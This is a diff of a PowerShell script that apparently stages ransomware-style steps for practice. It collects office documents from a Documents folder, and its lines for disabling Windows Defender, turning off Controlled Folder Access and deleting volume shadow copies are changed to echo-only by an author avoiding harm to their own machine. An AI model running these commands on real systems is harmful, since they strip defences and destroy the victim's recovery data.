@@ -2,7 +2,7 @@
 Search the filesystem  for docx, xlsx, pdf, and txt files 
 and copy those to a new folder. 
 #>
-<#
+
 # Locate files to be extracted
 $fileList = Get-ChildItem -Recurse -Include *.docx,*.pdf, *.xlsx, *.txt -Path .\Documents 
 
@@ -46,6 +46,11 @@ Turning off Windows Defender
 and delelting volume shadow copies and restore points
 #>
 
-Set-MpPreference -DisableRealtimeMonitoring $true
-Set-MpPreference -EnableControlledFolderAccess Disabled
-Get-MpComputerStatus
+# Disable Controlled Folder Access
+# I have this command echoed because I do not want to run it on my own machine
+echo "Set-MpPreference -EnableControlledFolderAccess Disabled"
+
+
+# Delete the volume shadow copies and restore points
+# I have this command echoed because I do not want to run it on my own machine
+echo 'Write-Host "vssadmin delete shadows /all /quiet"'
